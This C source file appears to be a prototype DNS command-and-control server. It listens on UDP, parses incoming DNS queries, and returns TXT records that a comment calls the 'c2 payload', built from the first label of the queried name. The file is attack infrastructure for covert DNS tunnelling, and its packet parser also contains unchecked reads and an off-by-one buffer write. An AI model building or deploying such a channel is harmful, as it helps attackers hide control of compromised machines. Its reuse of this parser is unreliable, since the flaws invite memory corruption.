#include "listener.h"

int main()
{
    int sockfd;
    struct sockaddr_in server_addr, client_addr; // Store client & server ip addr
    char buffer[MAX_BUFFER_SIZE];                // Store incoming data
    socklen_t addr_len = sizeof(client_addr);

    memset(&server_addr, 0, sizeof(server_addr));
    memset(&client_addr, 0, sizeof(client_addr));

    // Allocate resources for network endpoint.
    // IPv4, UDP
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
    {
        perror("Socket Creation Failed");
        exit(EXIT_FAILURE);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr("10.100.102.4");
    server_addr.sin_port = htons(PORT); // Listen on port

    // Bind port for listening
    if ((bind(sockfd, (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0))
    {

        perror("Port Binding failed.");
        exit(EXIT_FAILURE);
    }
    else
    {
        printf("Port %d successfully binded.\n", PORT);
    }

    printf("Listening on port %d for UDP packets..", PORT);

    while (TRUE)
    {
        // Wait until data packet, write from sockfd file to buffer
        int n = recvfrom(sockfd, (char *)buffer, MAX_BUFFER_SIZE, MSG_WAITALL, (struct sockaddr *)&client_addr, &addr_len);
        if (n < 0)
        {
            perror("Recv failed");
            continue;
        }
        buffer[n] = '\0';

        // Packet Recived
        printf("\nRecived packet from %s:%d\n", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));

        struct dns_packet packet;
        parse_dns_packet(buffer, &packet);

        printf("ID: 0x%X | Domain: %s | Type: %d\n",
               ntohs(packet.header.id),
               packet.question.name,
               packet.question.qtype);

        // After reciving packet and parsing it, return valid response back to client
        send_response(sockfd, buffer, n, &packet, &client_addr, addr_len);
    }

    return 0;
}

void parse_dns_packet(char *buffer, struct dns_packet *packet)
{
    struct dns_header *raw_header = (struct dns_header *)buffer;
    packet->header = *raw_header; // Copy header

    char *reader = buffer + sizeof(struct dns_header);

    // Parse the QNAME
    int i = 0;
    while (*reader != 0 && i < 255)
    {
        int length = *reader;
        reader++;

        for (int j = 0; j < length && i < 255; j++)
        {
            packet->question.name[i++] = *reader;
            reader++;
        }
        packet->question.name[i++] = '.'; // Add dot separator
    }

    packet->question.name[i - 1] = '\0';

    // Parse Qtype & Qclass
    // QTYPE is 2 bytes after the QNAME
    reader++;

    unsigned short *qtype_ptr = (unsigned short *)reader;
    packet->question.qtype = ntohs(*qtype_ptr);

    // QCLASS is 2 bytes after QTYPE
    reader += 2;
    unsigned short *qclass_ptr = (unsigned short *)reader;
    packet->question.qclass = ntohs(*qclass_ptr);
};

void send_response(int sockfd, char *request_buffer, int request_len, struct dns_packet *parsed_packet, struct sockaddr_in *client_addr, socklen_t addr_len)
{
    char reply_buffer[MAX_BUFFER_SIZE];
    memset(reply_buffer, 0, MAX_BUFFER_SIZE);

    // --- HEADER ---
    struct dns_header *reply_header = (struct dns_header *)reply_buffer;
    *reply_header = parsed_packet->header; // Copy ID and flags
    reply_header->flags = htons(0x8180);   // Standard Response, No Error
    reply_header->ans_count = htons(1);    // 1 Answer
    reply_header->auth_count = 0;
    reply_header->add_count = 0;

    // --- QUESTION SECTION ---
    char *q_ptr = request_buffer + DNS_HEADER_SIZE; // find length of original question section
    while (*q_ptr != 0)
        q_ptr += (*q_ptr) + 1; // Skip labels
    q_ptr += 1 + 2 + 2;        // Skip Null byte, QType(2), QClass(2)

    int q_len = q_ptr - (request_buffer + DNS_HEADER_SIZE);
    memcpy(reply_buffer + DNS_HEADER_SIZE, request_buffer + DNS_HEADER_SIZE, q_len);

    // --- TXT Record for c2 payload ---
    struct dns_answer *answer = (struct dns_answer *)(reply_buffer + DNS_HEADER_SIZE + q_len);

    // Payload Data
    char txt_data[256];
    extractPayload(parsed_packet->question.name, txt_data);
    int txt_len = strlen(txt_data);

    answer->name = htons(0xC00C); // Pointer to question name
    answer->qtype = htons(16);    // TXT
    answer->qclass = htons(1);    // Class IN
    answer->ttl = htonl(60);      // TTL 60s
    answer->data_len = htons(txt_len + 1);

    // Fill RDATA
    char *rdata = (char *)answer + sizeof(struct dns_answer);
    *rdata = (unsigned char)txt_len;      // First byte is length
    memcpy(rdata + 1, txt_data, txt_len); // Then the string

    int total_len = DNS_HEADER_SIZE + q_len + sizeof(struct dns_answer) + txt_len + 1;
    sendto(sockfd, reply_buffer, total_len, 0, (struct sockaddr *)client_addr, addr_len);

    printf("Sent TXT response (%d bytes)\n", total_len);
}

int extractPayload(char *qname, char *payload)
{
    char *reader = qname;
    for (int i = 0; i < strlen(qname); i++)
    {
        if (*reader == '.')
        {
            // Extract payload
            int len = reader - qname;
            // Copy payload to output
            strncpy(payload, qname, len);
            payload[len] = '\0';
            return len;
        }
        reader++;
    }
    return 0; // Not found
}